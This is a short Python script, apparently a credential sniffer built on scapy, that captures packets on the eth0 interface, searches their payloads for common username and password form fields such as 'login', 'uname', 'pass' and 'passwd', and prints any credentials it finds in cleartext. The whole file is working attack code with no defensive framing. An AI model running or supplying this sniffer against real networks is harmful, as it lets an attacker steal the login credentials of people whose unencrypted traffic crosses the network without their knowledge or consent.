from scapy.all import *
from urllib import parse
import re

iface = 'eth0'

#Parse for unencrypted username or password
def get_login_pass(body):
    user = None
    password = None

    userfields = ['login', 'username', 'uname', 'email', 'user', 'userid', '_uname', '_userid']
    passwordfields = ['ahd_password', 'pass', 'password', 'passwd', 'login_password', 'loginpassword']

    for login in userfields:
        login_re = re.search(('%s=[^&]+') % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()

    for passwrd in passwordfields:
        pass_re = re.search(('%s=[^&]+') % passwrd, body, re.IGNORECASE)
        if pass_re:
            password = pass_re.group()
    return user, password

#Sniff packets if they have TCP/IP layer
def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)
        username, password = get_login_pass(body)
        if username and password:
            print(packet[TCP].payload)
            print(parse.unquote(username))
            print(parse.unquote(password))
    else:
        pass

#Sniff packets
try:
    sniff(iface=iface, prn=pkt_parser, store=0)
except KeyboardInterrupt:
    print('Exiting')
    exit(0)
